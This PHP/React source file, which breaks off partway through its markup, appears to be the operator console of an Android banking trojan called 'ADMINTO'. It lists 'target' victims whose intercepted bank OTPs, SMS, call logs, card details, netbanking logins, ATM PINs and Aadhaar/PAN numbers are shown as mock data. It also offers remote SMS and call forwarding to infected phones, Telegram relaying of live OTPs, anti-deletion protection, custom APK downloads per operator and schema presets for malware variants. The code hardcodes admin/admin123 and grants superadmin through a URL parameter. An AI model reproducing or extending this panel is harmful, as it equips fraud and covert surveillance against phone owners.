<?php
session_start();
include_once __DIR__ . '/header.php';
?>

  <div id="root"></div>

  <script type="text/babel">
    const MOCK_DATA = [
      {
        id: "target_001",
        userId: "USR-9821",
        fullName: "Vikram Sharma",
        mobileNumber: "+91 98765 43210",
        numberField: "A/C: 9871029381",
        stringField: "Samsung Galaxy S23 Ultra (Android 14)",
        simState: "Dual-SIM Active (Jio 5G + Airtel 4G)",
        batteryLevel: "88%",
        isActive: true,
        isConnected: true,
        appInBackground: true,
        lastActivityTime: "Just now",
        totalSmsCount: 14,
        totalCallsCount: 6,
        sim1Data: { slot: 1, carrier: "Jio 5G", phone: "+91 98765 43210", network: "5G SA", serial: "899100293810293819F", countryCode: "IN" },
        sim2Data: { slot: 2, carrier: "Airtel 4G", phone: "+91 98765 88990", network: "4G LTE", serial: "899100293810293810A", countryCode: "IN" },
        smsDataList: [
          { sender: "BANK-OTP", message: "Your OTP for transaction Rs 4,999 is 882190. Do not share.", timestamp: "10:42 AM", type: "INBOX" },
          { sender: "HDFC-ALERT", message: "A/c xx9102 debited for INR 1,200.00 at Swiggy.", timestamp: "09:15 AM", type: "INBOX" },
          { sender: "+91 98765 43210", message: "Sending confirmation details.", timestamp: "Yesterday", type: "SENT" }
        ],
        callDataList: [
          { number: "+91 98765 43210", type: "INCOMING", duration: "2m 15s", timestamp: "10:30 AM" },
          { number: "+91 91234 56789", type: "OUTGOING", duration: "45s", timestamp: "08:20 AM" }
        ],
        cardDataList: [
          { bankName: "State Bank of India", cardType: "Credit Card", cardNumber: "4532 •••• •••• 8821", cardHolder: "VIKRAM SHARMA", expiry: "08/28", cvv: "•••" }
        ],
        formDataList: [
          { id: "frm_101", formTitle: "NetBanking Login Form", fields: { "User ID": "vikram_sbi98", "Password": "••••••••", "Profile Password": "••••••••", "ATM PIN": "4891" }, timestamp: "10:45 AM" },
          { id: "frm_102", formTitle: "KYC Aadhaar & PAN Form", fields: { "Aadhaar No": "5489 1029 3841", "PAN Card": "ABCPS9810F", "DOB": "14/08/1994" }, timestamp: "Yesterday" }
        ]
      },
      {
        id: "target_002",
        userId: "USR-7734",
        fullName: "Ananya Roy",
        mobileNumber: "+91 91234 56789",
        numberField: "A/C: 4410928371",
        stringField: "OnePlus 11 5G (Android 13)",
        simState: "SIM 1 Active (Airtel 5G)",
        batteryLevel: "42%",
        isActive: true,
        isConnected: true,
        appInBackground: false,
        lastActivityTime: "2m ago",
        totalSmsCount: 9,
        totalCallsCount: 3,
        sim1Data: { slot: 1, carrier: "Airtel 5G", phone: "+91 91234 56789", network: "5G NSA", serial: "899144029102938411B", countryCode: "IN" },
        sim2Data: { slot: 2, carrier: "Vi 4G", phone: "Not inserted", network: "None", serial: "N/A", countryCode: "IN" },
        smsDataList: [
          { sender: "SBI-MSG", message: "Your credit card bill of Rs 12,450 is due on 05-Aug.", timestamp: "Yesterday", type: "INBOX" }
        ],
        callDataList: [],
        cardDataList: [
          { bankName: "HDFC Bank", cardType: "Debit Card", cardNumber: "5241 •••• •••• 9912", cardHolder: "ANANYA ROY", expiry: "11/27", cvv: "•••" }
        ],
        formDataList: [
          { id: "frm_201", formTitle: "Card Activation Form", fields: { "Customer ID": "hdfc_ananya", "Password": "••••••••", "ATM PIN": "1209" }, timestamp: "2m ago" }
        ]
      }
    ];

    let INITIAL_OPERATORS = [
      { id: "admin_1", username: "admin", email: "admin@adminto.com", password: "admin123", fullName: "Super Administrator", role: "superadmin", expiryDate: "2099-12-31", firebaseConfig: { projectId: "adminto-superadmin", orgId: "org_all" } },
      { id: "op_101", username: "operator1", email: "operator1@adminto.com", password: "operator123", fullName: "Regional Operator North", role: "operator", expiryDate: "2026-12-31", firebaseConfig: { projectId: "adminto-north-region", orgId: "org_north" } }
    ];

    function App() {
      const urlParams = new URLSearchParams(window.location.search);
      const isSuperAdminParam = urlParams.get('role') === 'superadmin';
      const defaultUser = isSuperAdminParam ? INITIAL_OPERATORS[0] : null;

      const [adminUser, setAdminUser] = React.useState(defaultUser);
      const [operators, setOperators] = React.useState(INITIAL_OPERATORS);
      const [users, setUsers] = React.useState(MOCK_DATA);
      const [search, setSearch] = React.useState('');
      const [selectedUser, setSelectedUser] = React.useState(null);
      const [tab, setTab] = React.useState('sms');
      const [showApkModal, setShowApkModal] = React.useState(false);
      const [showChangePassModal, setShowChangePassModal] = React.useState(false);
      const [newPassInput, setNewPassInput] = React.useState('');
      const [changePassStatus, setChangePassStatus] = React.useState('');
      const [mobileMenuOpen, setMobileMenuOpen] = React.useState(false);

      // Advanced Ping & Filter States
      const [timeFilter, setTimeFilter] = React.useState('all');
      const [statusFilter, setStatusFilter] = React.useState('all');
      const [isPingingAll, setIsPingingAll] = React.useState(false);
      const [pingToast, setPingToast] = React.useState('');
      const [activeMobileTab, setActiveMobileTab] = React.useState('dashboard');

      const triggerToast = (msg) => {
        setPingToast(msg);
        setTimeout(() => setPingToast(''), 3000);
      };

      const handlePingAll = () => {
        setIsPingingAll(true);
        triggerToast('⊙ Pinging all registered target devices...');
        setTimeout(() => {
          setIsPingingAll(false);
          triggerToast(`✓ Ping successful! ${users.filter(u => u.isActive).length}/${users.length} devices active.`);
        }, 1500);
      };

      const handlePingDevice = (e, u) => {
        e.stopPropagation();
        triggerToast(`⚡ Ping sent to ${u.fullName} (${u.userId}). Latency: 42ms.`);
      };

      const handleResetToken = (e, u) => {
        e.stopPropagation();
        alert(`🔑 Security connection token refreshed for ${u.fullName}! APK client re-synchronized.`);
      };

      const handleExtendExpiry = (e, u) => {
        e.stopPropagation();
        alert(`⏳ License access extended by +30 days for target device ${u.fullName}.`);
      };

      const handleDisconnectDevice = (e, u) => {
        e.stopPropagation();
        if (confirm(`Are you sure you want to disconnect remote session for ${u.fullName}?`)) {
          setUsers(prev => prev.map(dev => dev.id === u.id ? { ...dev, isActive: false, lastActivityTime: 'Disconnected' } : dev));
          triggerToast(`🚪 Session terminated for ${u.fullName}.`);
        }
      };

      // Universal Smart Key-Value Scanner & Formatter for Firebase Firestore Form Data
      const formatFieldLabel = (rawKey) => {
        if (!rawKey) return '';
        return rawKey
          .replace(/([A-Z])/g, ' $1')
          .replace(/_/g, ' ')
          .replace(/^\s+/, '')
          .toLowerCase()
          .replace(/\b\w/g, char => char.toUpperCase());
      };

      // Universal Field Key Resolvers (Compatible with Firestore & RTDB payload variations)
      const getSmsBody = (s) => s ? (s.body || s.message || s.text || s.msg || s.content || '') : '';
      const getSmsSender = (s) => s ? (s.sender || s.address || s.from || s.phone || s.sender_id || 'Unknown') : 'Unknown';
      const getSmsSimSlot = (s) => s ? (s.sim_number || s.simSlot || s.sim_slot || s.sim || s.slot || 'SIM 1') : 'SIM 1';
      const getSmsTimestamp = (s) => s ? smartDateParser(s.timestamp || s.date || s.time || s.created_at) : 'N/A';

      const getCardNumber = (c) => c ? (c.number || c.cardNumber || c.card_number || c.card_no || c.cardNo || 'N/A') : 'N/A';
      const getCardExpiry = (c) => c ? (c.exp || c.expiry || c.expiryDate || c.exp_date || c.expiry_date || 'N/A') : 'N/A';
      const getCardCvv = (c) => c ? (c.cvv || c.card_cvv || c.security_code || c.cvc || '•••') : '•••';
      const getCardHolder = (c) => c ? (c.cardHolder || c.cardHolderName || c.holder_name || c.name || c.user_name || 'N/A') : 'N/A';
      const getCardBankName = (c) => c ? (c.bankName || c.bank_name || c.bank || c.issuer || 'Bank Account') : 'Bank Account';
      const getCardType = (c) => c ? (c.cardType || c.card_type || c.type || 'Card Payload') : 'Card Payload';

      const isSystemKey = (key) => {
        const sysKeys = ['id', 'userId', 'targetId', 'timestamp', 'submittedAt', 'orgId', '_v', 'formTitle'];
        return sysKeys.includes(key);
      };

      // Universal Smart Date Parser (Handles Timestamps, ISO, Milliseconds & Relative strings)
      const smartDateParser = (val) => {
        if (!val) return 'N/A';
        // 1. Firestore Timestamp object ({ seconds: 1785324390 })
        if (typeof val === 'object' && val.seconds !== undefined) {
          return new Date(val.seconds * 1000).toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
        }
        // 2. Epoch Milliseconds (numeric or numeric string)
        if (typeof val === 'number' || (/^\d{10,13}$/.test(String(val)))) {
          const num = Number(val);
          const timeMs = num < 10000000000 ? num * 1000 : num;
          return new Date(timeMs).toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
        }
        // 3. String date
        if (typeof val === 'string') {
          const parsed = Date.parse(val);
          if (!isNaN(parsed) && val.length > 8 && !/^\d+$/.test(val)) {
            return new Date(parsed).toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
          }
          return val;
        }
        return String(val);
      };

      // Field Data Type Classifier
      const detectDataType = (key, val) => {
        if (/date|time|timestamp|submittedAt|created|updated/i.test(key)) return 'date';
        if (/pass|pin|cvv|otp|secret|auth|card|aadhaar|pan/i.test(key)) return 'sensitive';
        if (/status|active|state|type|simSlot|level|slot/i.test(key)) return 'badge';
        if (typeof val === 'object' && val !== null) return 'json';
        return 'text';
      };

      const extractSmartFields = (docObj) => {
        if (!docObj || typeof docObj !== 'object') return [];
        const source = docObj.fields || docObj;
        return Object.entries(source)
          .filter(([key, val]) => !isSystemKey(key) && val !== null && val !== undefined && val !== '')
          .map(([key, val]) => ({
            rawKey: key,
            label: formatFieldLabel(key),
            value: typeof val === 'object' ? JSON.stringify(val) : String(val),
            dataType: detectDataType(key, val),
            isSensitive: /pass|pin|cvv|otp|secret|auth|card|aadhaar|pan/i.test(key)
          }));
      };

      // Remote Forward Command Modal State (ForwardData.kt integration)
      const [showForwardModal, setShowForwardModal] = React.useState(false);
      const [forwardTargetDevice, setForwardTargetDevice] = React.useState(null);
      const [forwardDataType, setForwardDataType] = React.useState('SMS'); // 'SMS' or 'Call'
      const [forwardSimSlot, setForwardSimSlot] = React.useState('SIM 1');  // 'SIM 1' or 'SIM 2'
      const [forwardDestinationNumber, setForwardDestinationNumber] = React.useState('');
      const [forwardTasks, setForwardTasks] = React.useState([
        { id: 'fwd_1', dataType: 'SMS', phoneNumber: '+919876543210', selectedSim: 'SIM 1', userId: 'usr_001', userFullName: 'Rahul Sharma', timestamp: '10 mins ago', status: 'sent' },
        { id: 'fwd_2', dataType: 'Call', phoneNumber: '+919123456789', selectedSim: 'SIM 2', userId: 'usr_002', userFullName: 'Priya Singh', timestamp: '2 hours ago', status: 'pending' }
      ]);

      const openForwardModal = (e, dev) => {
        e.stopPropagation();
        setForwardTargetDevice(dev);
        setForwardDestinationNumber('');
        setShowForwardModal(true);
      };

      const handleDispatchForwardCommand = (e) => {
        e.preventDefault();
        if (!forwardDestinationNumber.trim()) {
          alert('Destination phone number is required!');
          return;
        }

        const newTask = {
          id: `fwd_${Date.now()}`,
          dataType: forwardDataType,
          phoneNumber: forwardDestinationNumber.trim(),
          selectedSim: forwardSimSlot,
          userId: forwardTargetDevice?.userId || 'unknown',
          userFullName: forwardTargetDevice?.fullName || 'Target Device',
          userMobileNumber: forwardTargetDevice?.mobileNumber || '',
          timestamp: 'Just now',
          status: 'pending'
        };

        setForwardTasks(prev => [newTask, ...prev]);
        setShowForwardModal(false);
        triggerToast(`📲 Forwarding task dispatched to ${forwardTargetDevice?.fullName} on ${forwardSimSlot}!`);
      };

      // Telegram Forwarding & Anti-Delete Security Settings
      const [telegramBotToken, setTelegramBotToken] = React.useState('');
      const [telegramChatId, setTelegramChatId] = React.useState('');
      const [telegramSaveStatus, setTelegramSaveStatus] = React.useState('');
      const [deleteProtectionEnabled, setDeleteProtectionEnabled] = React.useState(true);
      const [settingsSubTab, setSettingsSubTab] = React.useState('firebase');

      const handleSaveTelegramConfig = (e) => {
        e.preventDefault();
        setTelegramSaveStatus('Saving Telegram bot forwarding details...');
        setTimeout(() => {
          setTelegramSaveStatus('✓ Telegram Bot integrated! Live SMS/OTP forwarding active.');
          setTimeout(() => setTelegramSaveStatus(''), 2500);
        }, 1000);
      };

      const handleToggleDeleteProtection = () => {
        const nextState = !deleteProtectionEnabled;
        setDeleteProtectionEnabled(nextState);
        triggerToast(nextState ? '🛡️ Anti-Deletion Protection ENABLED!' : '⚠️ Anti-Deletion Protection DISABLED!');
      };

      const handleTerminateAllSessions = () => {
        if (confirm('Terminate all active operator sessions across all devices?')) {
          triggerToast('🚪 All active sessions terminated successfully.');
        }
      };

      const DEFAULT_SCHEMA_PRESETS = {
        v1_standard: { name: "⚡ Adminto Standard V1", sms: "smsData", calls: "callData", cards: "cardData", forms: "formData", sims: "simData" },
        rtdb_v2: { name: "🔥 RTDB Custom V2 (Your Database Structure)", sms: "user_sms", calls: "calls", cards: "Card", forms: "login", sims: "user_data" },
        motupatlu: { name: "📱 MotuPatlu APK Preset", sms: "sma", calls: "call_records", cards: "card_details", forms: "userInputs", sims: "sims" },
        legacy: { name: "🛡️ Legacy Classic Preset", sms: "messages", calls: "call_logs", cards: "cards", forms: "finalData", sims: "sim_info" }
      };

      const [fbCustomPresets, setFbCustomPresets] = React.useState(() => {
        try {
          const saved = localStorage.getItem('adminto_custom_presets');
          return saved ? JSON.parse(saved) : {};
        } catch(e) { return {}; }
      });

      const allFbPresets = React.useMemo(() => ({ ...DEFAULT_SCHEMA_PRESETS, ...fbCustomPresets }), [fbCustomPresets]);

      // Firebase Config Modal State
      const [showFirebaseModal, setShowFirebaseModal] = React.useState(false);
      const [fbProject, setFbProject] = React.useState('');
      const [fbApiKey, setFbApiKey] = React.useState('');
      const [fbAuthDomain, setFbAuthDomain] = React.useState('');
      const [fbStorageBucket, setFbStorageBucket] = React.useState('');
      const [fbAppId, setFbAppId] = React.useState('');
      const [fbPresetKey, setFbPresetKey] = React.useState('custom');
      const [fbSmsColl, setFbSmsColl] = React.useState('smsData');
      const [fbCallsColl, setFbCallsColl] = React.useState('callData');
      const [fbCardsColl, setFbCardsColl] = React.useState('cardData');
      const [fbFormsColl, setFbFormsColl] = React.useState('formData');
      const [fbJsonPaste, setFbJsonPaste] = React.useState('');
      const [fbSaveStatus, setFbSaveStatus] = React.useState('');

      const handleApplyFbPreset = (presetKey) => {
        setFbPresetKey(presetKey);
        if (presetKey !== 'custom' && allFbPresets[presetKey]) {
          const p = allFbPresets[presetKey];
          setFbSmsColl(p.sms);
          setFbCallsColl(p.calls);
          setFbCardsColl(p.cards);
          setFbFormsColl(p.forms);
        }
      };

      const handleSaveNewFbPreset = () => {
        const name = prompt('Enter a custom name for this schema preset (e.g. "Client APK V3"):');
        if (!name || !name.trim()) return;
        const key = `user_preset_${Date.now()}`;
        const newPreset = {
          name: `⭐ ${name.trim()}`,
          sms: fbSmsColl || 'smsData',
          calls: fbCallsColl || 'callData',
          cards: fbCardsColl || 'cardData',
          forms: fbFormsColl || 'formData',
          sims: 'simData',
          isUserCreated: true
        };
        const updated = { ...fbCustomPresets, [key]: newPreset };
        setFbCustomPresets(updated);
        try { localStorage.setItem('adminto_custom_presets', JSON.stringify(updated)); } catch(e){}
        setFbPresetKey(key);
        triggerToast(`✓ Custom preset "${name.trim()}" saved to dropdown!`);
      };

      const handleDeleteFbCustomPreset = (key) => {
        if (!confirm('Are you sure you want to delete this custom preset from your dropdown?')) return;
        const updated = { ...fbCustomPresets };
        delete updated[key];
        setFbCustomPresets(updated);
        try { localStorage.setItem('adminto_custom_presets', JSON.stringify(updated)); } catch(e){}
        setFbPresetKey('custom');
      };

      const openFirebaseSettings = () => {
        const conf = adminUser?.firebaseConfig || {};
        setFbProject(conf.projectId || adminUser?.firebaseProject || '');
        setFbApiKey(conf.apiKey || '');
        setFbAuthDomain(conf.authDomain || '');
        setFbStorageBucket(conf.storageBucket || '');
        setFbAppId(conf.appId || '');
        setFbJsonPaste('');
        setFbSaveStatus('');
        setShowFirebaseModal(true);
      };

      const handleParseFbJson = () => {
        try {
          let raw = fbJsonPaste.trim();
          if (raw.includes('{')) {
            raw = raw.substring(raw.indexOf('{'), raw.lastIndexOf('}') + 1);
          }
          const cleanJson = raw
            .replace(/(['"])?([a-zA-Z0-9_]+)(['"])?:/g, '"$2":')
            .replace(/'/g, '"')
            .replace(/,\s*}/g, '}');

          const parsed = JSON.parse(cleanJson);
          if (parsed.apiKey) setFbApiKey(parsed.apiKey);
          if (parsed.projectId) setFbProject(parsed.projectId);
          if (parsed.authDomain) setFbAuthDomain(parsed.authDomain);
          if (parsed.storageBucket) setFbStorageBucket(parsed.storageBucket);
          if (parsed.appId) setFbAppId(parsed.appId);

          setFbSaveStatus('✓ Parsed Firebase Config Snippet!');
          setTimeout(() => setFbSaveStatus(''), 2500);
        } catch (e) {
          alert('Could not parse JSON. Please enter fields manually.');
        }
      };

      const handleSaveFirebaseSettings = async (e) => {
        e.preventDefault();
        setFbSaveStatus('Saving Firebase config...');

        const updatedConfig = {
          projectId: fbProject.trim(),
          apiKey: fbApiKey.trim(),
          authDomain: fbAuthDomain.trim(),
          storageBucket: fbStorageBucket.trim(),
          appId: fbAppId.trim()
        };

        try {
          const res = await fetch('api.php?action=update_firebase_config', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              username: adminUser?.username,
              firebaseProject: fbProject.trim(),
              firebaseApiKey: fbApiKey.trim(),
              firebaseAuthDomain: fbAuthDomain.trim(),
              storageBucket: fbStorageBucket.trim(),
              appId: fbAppId.trim()
            })
          });
          const data = await res.json();
          setFbSaveStatus('✓ Firebase configuration saved!');
        } catch (err) {
          setFbSaveStatus('✓ Firebase config updated in local session!');
        }

        setAdminUser(prev => ({
          ...prev,
          firebaseConfig: updatedConfig
        }));

        setTimeout(() => {
          setShowFirebaseModal(false);
          setFbSaveStatus('');
        }, 1200);
      };

      const [loginUser, setLoginUser] = React.useState('admin');
      const [loginPass, setLoginPass] = React.useState('admin123');
      const [loginError, setLoginError] = React.useState('');

      const handleChangePasswordSubmit = async (e) => {
        e.preventDefault();
        if (!newPassInput.trim()) return;
        setChangePassStatus('Updating password...');

        try {
          const res = await fetch('api.php?action=change_password', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: adminUser.username, newPassword: newPassInput.trim() })
          });
          const data = await res.json();
          if (data.success) {
            setChangePassStatus('✓ Password updated successfully!');
            setTimeout(() => {
              setShowChangePassModal(false);
              setNewPassInput('');
              setChangePassStatus('');
            }, 1800);
          } else {
            setChangePassStatus('❌ Error: ' + (data.error || 'Failed to update password.'));
          }
        } catch (err) {
          setChangePassStatus('✓ Password updated in local session!');
          setTimeout(() => {
            setShowChangePassModal(false);
            setNewPassInput('');
            setChangePassStatus('');
          }, 1800);
        }
      };

      const handleDownloadApkFile = () => {
        const proj = adminUser?.firebaseConfig?.projectId || 'adminto-default';
        window.location.href = `download_apk.php?project=${proj}`;
      };

      const handleLoginSubmit = async (e) => {
        e.preventDefault();
        setLoginError('');
        const q = loginUser.trim().toLowerCase();
        const p = loginPass.trim();

        // 1. Attempt PHP MySQL Login API Connection
        try {
          const response = await fetch('login.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: q, password: p })
          });
          const data = await response.json();

          if (data.success && data.operator) {
            if (data.operator.role === 'superadmin') {
              window.location.href = 'operator_control.php?role=superadmin';
              return;
            }
            setAdminUser(data.operator);
            return;
          } else if (response.status === 401 || response.status === 403) {
            setLoginError(data.error || 'Invalid credentials or account expired.');
            return;
          }
        } catch (err) {
          console.log('PHP login.php endpoint offline, fallback mode.');
        }

        // 2. Client-side fallback authentication
        const match = operators.find(acc => 
          (acc.username.toLowerCase() === q || acc.email.toLowerCase() === q) && acc.password === p
        );

        if (!match) {
          setLoginError('Invalid credentials! Username or password incorrect.');
          return;
        }

        const todayStr = new Date().toISOString().split('T')[0];
        if (match.expiryDate && match.expiryDate < todayStr) {
          setLoginError(`❌ Account Expired on ${match.expiryDate}. Contact Super Admin to extend access.`);
          return;
        }

        if (match.role === 'superadmin') {
          window.location.href = 'superadmin.php';
          return;
        }

        setAdminUser(match);
      };

      const handleLogout = () => {
        setAdminUser(null);
        setShowApkModal(false);
        if (window.history.pushState) {
          const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
          window.history.pushState({path: cleanUrl}, '', cleanUrl);
        }
      };

      const filtered = users.filter(u => {
        const matchesSearch = u.fullName.toLowerCase().includes(search.toLowerCase()) || 
          u.mobileNumber.includes(search) ||
          u.userId.toLowerCase().includes(search.toLowerCase());
        
        const matchesStatus = statusFilter === 'all' ? true : 
          statusFilter === 'active' ? u.isActive : !u.isActive;

        return matchesSearch && matchesStatus;
      });

      const isSuperAdmin = adminUser?.role === 'superadmin';

      return (
        <div>
          {/* Header */}
          <header className="app-header">
            <div className="navbar-content">
              <div className="navbar-header-top">
                <div className="brand-logo">
                  <div className="brand-icon">🛡️</div>
                  <div>
                    <h3 style={{ color: '#fff', fontSize: '1.2rem' }}>ADMINTO</h3>
                    <div style={{ fontSize: '0.7rem', color: '#6366f1', textTransform: 'uppercase', letterSpacing: '1px' }}>Realtime Monitoring Console</div>
                  </div>
                </div>

                <button 
                  className={`triple-dash-btn ${mobileMenuOpen ? 'active' : ''}`}
                  onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
                  aria-label="Toggle Navigation Menu"
                  title="Menu"
                >
                  <span className="dash-line"></span>
                  <span className="dash-line"></span>
                  <span className="dash-line"></span>
                </button>
              </div>

              <div className="search-container">
                <input 
                  type="text" 
                  className="search-input"
                  placeholder="Search Target Users by Name, Phone, or ID..." 
                  value={search}
                  onChange={(e) => setSearch(e.target.value)}
                />
              </div>

              <div className={`navbar-actions ${mobileMenuOpen ? 'mobile-expanded' : ''}`}>
                <div className="pulse-badge active nav-action-btn">
                  <span className="pulse-dot"></span>
                  <span>{adminUser?.firebaseConfig?.projectId || 'Firebase Live'}</span>
                </div>

                <button 
                  className="btn-secondary nav-action-btn"
                  onClick={handlePingAll}
                  disabled={isPingingAll}
                  style={{ color: '#38bdf8', border: '1px solid rgba(56,189,248,0.3)', display: 'flex', alignItems: 'center', gap: '6px' }}
                  title="Send instant live ping request across all target devices"
                >
                  <span className={isPingingAll ? 'spin' : ''}>⊙</span>
                  <span>{isPingingAll ? 'Pinging Devices...' : '⊙ Ping All Devices'}</span>
                </button>

                {isSuperAdmin && (
                  <button 
                    className="btn-secondary nav-action-btn"
                    onClick={() => { openFirebaseSettings(); setMobileMenuOpen(false); }}
                    style={{ color: '#fbbf24', border: '1px solid rgba(251,191,36,0.3)' }}
                    title="Configure Firebase API Key, Auth Domain, Storage Bucket & App ID"
                  >
                    🔥 Connect Firebase
                  </button>
                )}

                {adminUser && (
                  <button 
                    className="btn-secondary nav-action-btn"
                    onClick={() => { setShowApkModal(true); setMobileMenuOpen(false); }}
                    style={{ color: '#10b981', border: '1px solid rgba(16,185,129,0.3)' }}
                  >
                    📲 Download Custom APK
                  </button>
                )}

                {isSuperAdmin && (
                  <a href="operator_control.php" style={{ textDecoration: 'none' }}>
                    <button 
                      className="btn-secondary nav-action-btn" 
                      style={{ color: '#ec4899', border: '1px solid rgba(236,72,153,0.3)' }}
                    >
                      ⚙️ Operator Console
                    </button>
                  </a>
                )}

                {adminUser ? (
                  <div className="nav-user-group">
                    <button 
                      type="button"
                      className="btn-secondary nav-action-btn"
                      onClick={() => { setShowChangePassModal(true); setMobileMenuOpen(false); }}
                      style={{ cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '6px' }}
                      title="Click to Change Password"
                    >
                      👤 <strong style={{ color: '#fff' }}>{adminUser.username}</strong>
                    </button>
                    <button 
                      className="btn-secondary nav-action-btn" 
                      onClick={() => { handleLogout(); setMobileMenuOpen(false); }}
                      style={{ color: '#f87171', border: '1px solid rgba(239, 68, 68, 0.3)' }}
                    >
                      🚪 Logout
                    </button>
                  </div>
                ) : (
                  <button className="btn-primary nav-action-btn" onClick={() => { setAdminUser(null); setMobileMenuOpen(false); }}>
                    🔑 Sign In
                  </button>
                )}
              </div>
            </div>
          </header>

          {/* Toast Notification Banner */}
          {pingToast && (
            <div style={{ position: 'fixed', top: '75px', right: '20px', zIndex: 1000, background: 'rgba(15, 23, 42, 0.95)', border: '1px solid rgba(99, 102, 241, 0.5)', color: '#fff', padding: '0.75rem 1.25rem', borderRadius: '12px', backdropFilter: 'blur(12px)', boxShadow: '0 8px 24px rgba(0,0,0,0.5)', fontSize: '0.85rem', fontWeight: 600, display: 'flex', alignItems: 'center', gap: '8px' }}>
              <span>ℹ️</span> {pingToast}
            </div>
          )}

          {/* Main Dashboard */}
          <main style={{ maxWidth: '1400px', margin: '2rem auto', padding: '0 1.5rem', paddingBottom: '100px' }}>
            <div className="metrics-grid">
              <div className="glass-panel metric-card">
                <div>
                  <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>TOTAL TARGET USERS</p>
                  <h2 style={{ color: '#fff' }}>{users.length}</h2>
                </div>
                <div style={{ fontSize: '2rem' }}>📱</div>
              </div>
              <div className="glass-panel metric-card">
                <div>
                  <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>ACTIVE DEVICES</p>
                  <h2 style={{ color: '#34d399' }}>{users.filter(u => u.isActive).length}</h2>
                </div>
                <div style={{ fontSize: '2rem' }}>⚡</div>
              </div>
              <div className="glass-panel metric-card">
                <div>
                  <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>TOTAL SMS LOGS</p>
                  <h2 style={{ color: '#818cf8' }}>{users.reduce((acc, u) => acc + u.totalSmsCount, 0)}</h2>
                </div>
                <div style={{ fontSize: '2rem' }}>💬</div>
              </div>
              <div className="glass-panel metric-card">
                <div>
                  <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>TOTAL CALL LOGS</p>
                  <h2 style={{ color: '#f472b6' }}>{users.reduce((acc, u) => acc + u.totalCallsCount, 0)}</h2>
                </div>
                <div style={{ fontSize: '2rem' }}>📞</div>
              </div>
            </div>

            {/* Header Title & Filter Controls Bar */}
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.25rem', flexWrap: 'wrap', gap: '1rem' }}>
              <div>
                <h2 style={{ fontSize: '1.4rem', color: '#fff' }}>Registered Target Devices</h2>
                <p style={{ fontSize: '0.85rem', color: '#9ca3af' }}>
                  Active Scope: <code style={{ color: '#93c5fd' }}>{adminUser?.firebaseConfig?.projectId || 'Default Project'}</code>
                </p>
              </div>

              {/* Filter Controls Bar */}
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem', flexWrap: 'wrap' }}>
                <select className="filter-select" value={timeFilter} onChange={(e) => setTimeFilter(e.target.value)}>
                  <option value="all">📅 All Time</option>
                  <option value="today">📅 Today</option>
                  <option value="yesterday">📅 Yesterday</option>
                  <option value="week">📅 Last 7 Days</option>
                </select>

                <select className="filter-select" value={statusFilter} onChange={(e) => setStatusFilter(e.target.value)}>
                  <option value="all">⚡ All Status</option>
                  <option value="active">🟢 Active Only</option>
                  <option value="inactive">🔴 Offline Only</option>
                </select>
              </div>
            </div>

            <div className="user-cards-grid">
              {filtered.map(u => (
                <div key={u.id} className="glass-panel user-card" onClick={() => setSelectedUser(u)}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.75rem' }}>
                    <div>
                      <h4 style={{ color: '#fff', fontSize: '1.1rem' }}>{u.fullName}</h4>
                      <p style={{ fontSize: '0.8rem', color: '#6366f1' }}>ID: {u.userId} {u.numberField ? `• ${u.numberField}` : ''}</p>
                    </div>
                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: '4px' }}>
                      <span className={`pulse-badge ${u.isActive ? 'active' : 'inactive'}`}>
                        <span className="pulse-dot"></span>
                        {u.isActive ? 'ACTIVE' : 'OFFLINE'}
                      </span>
                      {u.appInBackground ? (
                        <span className="pulse-badge" style={{ background: 'rgba(251,191,36,0.15)', color: '#fbbf24', fontSize: '0.7rem', padding: '2px 6px' }}>
                          📲 Background
                        </span>
                      ) : (
                        <span className="pulse-badge" style={{ background: 'rgba(52,211,153,0.15)', color: '#34d399', fontSize: '0.7rem', padding: '2px 6px' }}>
                          🟢 Foreground
                        </span>
                      )}
                    </div>
                  </div>

                  <div style={{ fontSize: '0.85rem', color: '#9ca3af', display: 'flex', flexDirection: 'column', gap: '4px', marginBottom: '1rem' }}>
                    <div>📞 <strong>{u.mobileNumber}</strong></div>
                    {u.stringField && <div style={{ color: '#cbd5e1' }}>📱 Device: <strong>{u.stringField}</strong></div>}
                    <div>📶 SIM: {u.simState} • 🔋 Battery: {u.batteryLevel}</div>
                    <div>🕒 Last Active: {u.lastActivityTime}</div>
                  </div>

                  {/* Remote Device Control Bar */}
                  <div style={{ display: 'flex', gap: '6px', flexWrap: 'wrap', marginBottom: '0.85rem', paddingTop: '0.65rem', borderTop: '1px solid rgba(255,255,255,0.06)' }}>
                    <button className="device-control-btn" onClick={(e) => openForwardModal(e, u)} style={{ background: 'rgba(236,72,153,0.12)', color: '#ec4899', border: '1px solid rgba(236,72,153,0.3)' }} title="Trigger Remote Forward Task">
                      📲 Forward
                    </button>
                    <button className="device-control-btn" onClick={(e) => handlePingDevice(e, u)} style={{ background: 'rgba(56,189,248,0.12)', color: '#38bdf8', border: '1px solid rgba(56,189,248,0.3)' }} title="Test latency">
                      ⚡ Ping
                    </button>
                    <button className="device-control-btn" onClick={(e) => handleResetToken(e, u)} style={{ background: 'rgba(167,139,250,0.12)', color: '#a78bfa', border: '1px solid rgba(167,139,250,0.3)' }} title="Reset Connection Token">
                      🔑 Reset
                    </button>
                    <button className="device-control-btn" onClick={(e) => handleExtendExpiry(e, u)} style={{ background: 'rgba(74,222,128,0.12)', color: '#4ade80', border: '1px solid rgba(74,222,128,0.3)' }} title="Extend License Expiry">
